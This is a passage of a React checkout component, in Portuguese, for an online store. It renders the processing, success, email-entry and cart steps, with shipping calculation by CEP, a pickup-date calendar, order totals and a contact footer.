          <div className="text-center p-8">
            <div className="bg-green-500 text-white p-4 rounded-lg mb-6 flex items-center gap-3">
              <Shield className="w-5 h-5" />
              <span className="font-medium">Aguarde... Estamos finalizando sua compra.</span>
            </div>

            <div className="w-16 h-16 mx-auto animate-spin border-4 border-gray-200 border-t-blue-600 rounded-full"></div>
          </div>
        </div>
      </div>
    )
  }

  if (currentStep === "success") {
    return (
      <div className="min-h-screen bg-gray-50 animate-fade-in">
        <CheckoutHeader />

        <div className="max-w-md mx-auto bg-white min-h-screen flex items-center justify-center">
          <div className="text-center p-8">
            <div className="bg-green-500 text-white p-6 rounded-lg mb-6">
              <div className="w-16 h-16 mx-auto mb-4 bg-white rounded-full flex items-center justify-center">
                <svg className="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <h2 className="text-xl font-semibold mb-2">Compra finalizada com sucesso!</h2>
              <p className="text-sm opacity-90">
                Seu pedido foi processado e você receberá um e-mail de confirmação em breve.
              </p>
            </div>

            <div className="space-y-4">
              <Button
                onClick={() => (window.location.href = "/")}
                className="w-full bg-orange-500 hover:bg-orange-600 text-white py-3 rounded-full font-semibold"
              >
                Voltar à loja
              </Button>

              <Button
                variant="outline"
                onClick={() => setCurrentStep("cart")}
                className="w-full border-orange-500 text-orange-500 hover:bg-orange-50 py-3 rounded-full font-semibold"
              >
                Ver detalhes do pedido
              </Button>
            </div>
          </div>
        </div>
      </div>
    )
  }

  if (currentStep === "email") {
    return (
      <div className="min-h-screen bg-gray-50 animate-fade-in">
        <CheckoutHeader />

        <div className="max-w-md mx-auto bg-white min-h-screen transform transition-all duration-500 ease-in-out">
          <div className="p-4 border-b">
            <h1 className="text-xl font-semibold text-gray-900 text-center">Finalizar compra</h1>
          </div>

          <div className="p-6 text-center">
            <h2 className="text-lg font-medium text-gray-700 mb-2">Para finalizar a compra, informe seu e-mail.</h2>
            <p className="text-sm text-gray-500 mb-8">Rápido. Fácil. Seguro.</p>

            <div className="mb-4">
              <Input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="seu@email.com"
                className={`w-full text-center ${emailError ? "border-red-500" : ""}`}
              />
              {emailError && <p className="text-xs text-red-500 mt-2">{emailError}</p>}
            </div>

            <Button
              onClick={handleEmailSubmit}
              className="w-full bg-orange-500 hover:bg-orange-600 text-white py-3 rounded-full font-semibold mb-4"
            >
              Continuar
            </Button>

            <div className="text-left mt-8">
              <p className="text-sm text-orange-600 font-medium mb-3">Usamos seu e-mail de forma 100% segura para:</p>
              <ul className="text-sm text-gray-600 space-y-2">
                <li className="flex items-center gap-2">
                  <span className="text-green-500">✓</span>
                  Identificar seu perfil
                </li>
                <li className="flex items-center gap-2">
                  <span className="text-green-500">✓</span>
                  Notificar sobre o andamento do seu pedido
                </li>
                <li className="flex items-center gap-2">
                  <span className="text-green-500">✓</span>
                  Gerenciar seu histórico de compras
                </li>
                <li className="flex items-center gap-2">
                  <span className="text-green-500">✓</span>
                  Acelerar o preenchimento de suas informações
                </li>
              </ul>
            </div>
          </div>
        </div>

        <div className="bg-gray-100 p-4 text-center text-sm text-gray-600">
          <p className="font-semibold text-orange-600 mb-2">FALE CONOSCO</p>
          <p className="mb-1">Telefone: (11) 3003-9030 - de segunda à sexta-feira, das 9h às 17h.</p>
          <p className="mb-4">
            M Shop Comercial LTDA | Rua Alexandre Dumas, 1630 - Chácara Santo Antônio - São Paulo/SP - CEP 04717-004 |
            CNPJ 01.490.698/0001-33 | Inscrição Estadual 115.012.872.118.
          </p>
          <div className="flex justify-center gap-2">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg/1200px-Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg.png?height=24&width=40&text=PIX"
              alt="PIX"
              className="h-6"
            />
          </div>
        </div>
      </div>
    )
  }

  if (currentStep === "cart") {
    return (
      <div className="min-h-screen bg-gray-50 animate-fade-in">
        <CheckoutHeader />

        {showNotification && (
          <div className="fixed top-0 left-0 right-0 z-50 animate-slide-down">
            <div className="bg-orange-500 text-white px-4 py-3 text-center text-sm font-medium shadow-lg">
              <div className="max-w-md mx-auto flex items-center justify-between">
                <span>Essa opção não está disponível para esse produto.</span>
                <button
                  onClick={() => setShowNotification(false)}
                  className="ml-2 hover:bg-orange-600 rounded-full p-1"
                >
                  <X size={16} />
                </button>
              </div>
            </div>
          </div>
        )}

        <div className="max-w-md mx-auto bg-white min-h-screen transform transition-all duration-500 ease-in-out">
          <div className="p-4 border-b">
            <h1 className="text-xl font-semibold text-gray-900 text-center">Meu Carrinho</h1>
          </div>

          <div className="p-4">
            {cartItems.map((item) => (
              <div key={item.id} className="flex gap-3 mb-6">
                <img
                  src={item.image || "/placeholder.svg"}
                  alt={item.name}
                  className="w-16 h-16 object-cover rounded"
                />
                <div className="flex-1">
                  <div className="flex justify-between items-start mb-1">
                    <h3 className="text-sm font-medium text-gray-900 leading-tight">{item.name}</h3>
                    <button onClick={() => removeItem(item.id)} className="text-blue-500 p-1">
                      <Trash2 size={16} />
                    </button>
                  </div>
                  <p className="text-xs text-gray-500 mb-2">{item.description}</p>

                  <div className="flex justify-between items-center">
                    <div className="flex items-center gap-2">
                      <button
                        onClick={() => updateQuantity(item.id, item.quantity - 1)}
                        className="w-6 h-6 rounded-full bg-gray-200 flex items-center justify-center"
                      >
                        <Minus size={12} />
                      </button>
                      <span className="text-sm font-medium">{item.quantity}</span>
                      <button
                        onClick={() => updateQuantity(item.id, item.quantity + 1)}
                        className="w-6 h-6 rounded-full bg-gray-200 flex items-center justify-center"
                      >
                        <Plus size={12} />
                      </button>
                    </div>

                    <div className="text-right">
                      {item.isFree ? (
                        <span className="text-sm font-semibold text-green-600">GRÁTIS</span>
                      ) : (
                        <span className="text-sm font-semibold">R$ {item.price.toFixed(2).replace(".", ",")}</span>
                      )}
                    </div>
                  </div>

                  {item.quantity > 1 && <p className="text-xs text-red-500 mt-1">Limite de quantidade</p>}
                </div>
              </div>
            ))}
          </div>

          {/* ... existing code for delivery section ... */}

          <div className="px-4 pb-4">
            <h2 className="text-lg font-medium text-gray-700 mb-2">Entrega</h2>
            <p className="text-sm text-gray-600 mb-4">
              Veja as opções de entrega para seus itens, com todos os prazos e valores.
            </p>

            {!showDeliveryOptions ? (
              <Button
                onClick={() => setShowDeliveryOptions(true)}
                className="w-full bg-blue-50 text-blue-600 hover:bg-blue-100 border border-blue-200 mb-4"
              >
                CALCULAR
              </Button>
            ) : (
              <div className="mb-4">
                <div className="flex bg-gray-100 rounded-full p-1 mb-4">
                  <button
                    onClick={() => handleDeliveryMethodChange("RECEBER")}
                    className={`flex-1 py-2 px-4 rounded-full text-sm font-medium transition-colors ${
                      deliveryMethod === "RECEBER" ? "bg-orange-500 text-white" : "text-gray-600"
                    }`}
                  >
                    RECEBER
                  </button>
                  <button
                    onClick={() => handleDeliveryMethodChange("RETIRAR")}
                    className={`flex-1 py-2 px-4 rounded-full text-sm font-medium transition-colors ${
                      deliveryMethod === "RETIRAR" ? "bg-orange-500 text-white" : "text-gray-600"
                    }`}
                  >
                    RETIRAR
                  </button>
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">CEP</label>
                  <div className="flex gap-2 mb-2">
                    <Input
                      value={cep}
                      onChange={handleCepChange}
                      placeholder="00000-000"
                      maxLength={9}
                      className={`flex-1 ${cepError ? "border-red-500" : ""}`}
                    />
                    <Button
                      onClick={handleCalculateShipping}
                      disabled={isCalculating}
                      variant="outline"
                      className="text-blue-600 border-blue-600 hover:bg-blue-50 bg-transparent disabled:opacity-50"
                    >
                      {isCalculating ? <Loader2 className="w-4 h-4 animate-spin" /> : "Calcular"}
                    </Button>
                  </div>
                  {cepError && <p className="text-xs text-red-500 mb-2">{cepError}</p>}

                  {showShippingOptions && shippingOptions.length > 0 && (
                    <div className="mt-4 space-y-2">
                      {deliveryMethod === "RETIRAR" ? (
                        <div className="animate-fade-in">
                          <button
                            onClick={() => handleStoreSelection(shippingOptions[0])}
                            className={`w-full flex justify-between items-center p-3 border rounded-lg transition-colors ${
                              selectedStore ? "border-green-500 bg-green-50" : "border-gray-200 hover:border-gray-300"
                            }`}
                          >
                            <div className="text-left">
                              <p className="font-medium">{shippingOptions[0].type}</p>
                              <p className="text-sm text-gray-600">{shippingOptions[0].distance}</p>
                              <p className="text-xs text-gray-500">{shippingOptions[0].address}</p>
                            </div>
                            <p className="font-semibold text-green-600">Grátis</p>
                          </button>
                        </div>
                      ) : (
                        shippingOptions.map((option, index) => (
                          <div key={index} className="animate-fade-in" style={{ animationDelay: `${index * 200}ms` }}>
                            <button
                              onClick={() => setSelectedShipping(option)}
                              className={`w-full flex justify-between items-center p-3 border rounded-lg transition-colors ${
                                selectedShipping?.type === option.type
                                  ? "border-green-500 bg-green-50"
                                  : "border-gray-200 hover:border-gray-300"
                              }`}
                            >
                              <div className="text-left">
                                <p className="font-medium">{option.type}</p>
                                <p className="text-sm text-gray-600">{option.days}</p>
                              </div>
                              <p className="font-semibold">
                                {option.price === 0 ? "Grátis" : `R$ ${option.price.toFixed(2).replace(".", ",")}`}
                              </p>
                            </button>
                          </div>
                        ))
                      )}
                    </div>
                  )}

                  {showCalendar && deliveryMethod === "RETIRAR" && (
                    <div className="mt-4 animate-fade-in">
                      <div className="border rounded-lg p-4 bg-white">
                        <div className="flex items-center gap-2 mb-4">
                          <Calendar className="w-5 h-5 text-blue-600" />
                          <h3 className="font-medium text-gray-900">Escolha a data de início</h3>
                        </div>

                        {/* Navegação do mês */}
                        <div className="flex items-center justify-between mb-4">
                          <button onClick={() => navigateMonth("prev")} className="p-1 hover:bg-gray-100 rounded">
                            <ChevronLeft className="w-5 h-5" />
                          </button>
                          <h4 className="font-medium text-gray-900 capitalize">{formatMonthYear(currentMonth)}</h4>
                          <button onClick={() => navigateMonth("next")} className="p-1 hover:bg-gray-100 rounded">
                            <ChevronRight className="w-5 h-5" />
                          </button>
                        </div>

                        {/* Dias da semana */}
                        <div className="grid grid-cols-7 gap-1 mb-2">
                          {["Dom", "Seg", "Ter", "Qua", "Qui", "Sex", "Sáb"].map((day) => (
                            <div key={day} className="text-center text-sm font-medium text-gray-500 py-2">
                              {day}
                            </div>
                          ))}
                        </div>

                        {/* Calendário */}
                        <div className="grid grid-cols-7 gap-1 mb-4">
                          {generateCalendar().map((day, index) => (
                            <button
                              key={index}
                              onClick={() => (day.isAvailable ? setSelectedDate(day.dateString) : null)}
                              disabled={!day.isAvailable}
                              className={`
                                h-10 text-sm rounded transition-colors
                                ${!day.isCurrentMonth ? "text-gray-300" : ""}
                                ${day.isAvailable ? "hover:bg-blue-50 cursor-pointer" : "cursor-not-allowed"}
                                ${selectedDate === day.dateString ? "bg-blue-600 text-white" : ""}
                                ${!day.isAvailable && day.isCurrentMonth ? "text-gray-400" : ""}
                              `}
                            >
                              {day.day}
                            </button>
                          ))}
                        </div>

                        {/* Informações importantes */}
                        <div className="bg-blue-50 p-3 rounded-lg">
                          <h4 className="text-sm font-medium text-blue-800 mb-2">Informações importantes:</h4>
                          <ul className="text-xs text-blue-700 space-y-1">
                            <li>• Dias úteis e sábados disponíveis</li>
                            <li>• Seg-Sex: 09:00 às 18:00 | Sáb: 09:00 às 14:00</li>
                            <li>• Retirada a partir do próximo dia útil</li>
                            <li>• Produto reservado por até 7 dias</li>
                          </ul>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            )}

            <div className="space-y-3 mb-6">
              <Button variant="outline" className="w-full bg-gray-400 text-white border-gray-400 hover:bg-gray-500">
                Adicionar Código de vendedor
              </Button>
              <Button variant="outline" className="w-full bg-gray-400 text-white border-gray-400 hover:bg-gray-500">
                Adicionar cupom de desconto
              </Button>
            </div>

            <div className="space-y-2 mb-6">
              <div className="flex justify-between text-sm">
                <span>Subtotal</span>
                <span>R$ {calculateSubtotal().toFixed(2).replace(".", ",")}</span>
              </div>
              {calculateShipping() > 0 && (
                <div className="flex justify-between text-sm">
                  <span>Frete</span>
                  <span>R$ {calculateShipping().toFixed(2).replace(".", ",")}</span>
                </div>
              )}
              <div className="flex justify-between text-lg font-semibold pt-2 border-t">
                <span>Total</span>
                <span>R$ {calculateTotal().toFixed(2).replace(".", ",")}</span>
              </div>
            </div>

            <Button
              onClick={handleContinueToEmail}
              className="w-full bg-orange-500 hover:bg-orange-600 text-white py-3 rounded-full font-semibold mb-4"
            >
              Fechar pedido
            </Button>
          </div>
        </div>

        <div className="bg-gray-100 p-4 text-center text-sm text-gray-600">
          <p className="font-semibold text-orange-600 mb-2">FALE CONOSCO</p>
          <p className="mb-1">Telefone: (11) 3003-9030 - de segunda à sexta-feira, das 9h às 17h.</p>
          <p className="mb-4">
            M Shop Comercial LTDA | Rua Alexandre Dumas, 1630 - Chácara Santo Antônio - São Paulo/SP - CEP 04717-004 |
            CNPJ 01.490.698/0001-33 | Inscrição Estadual 115.012.872.118.
          </p>
          <div className="flex justify-center gap-2">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg/1200px-Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg.png"
              alt="PIX"
              className="h-6"
            />
          </div>
        </div>
      </div>
    )
  }

  return null
}
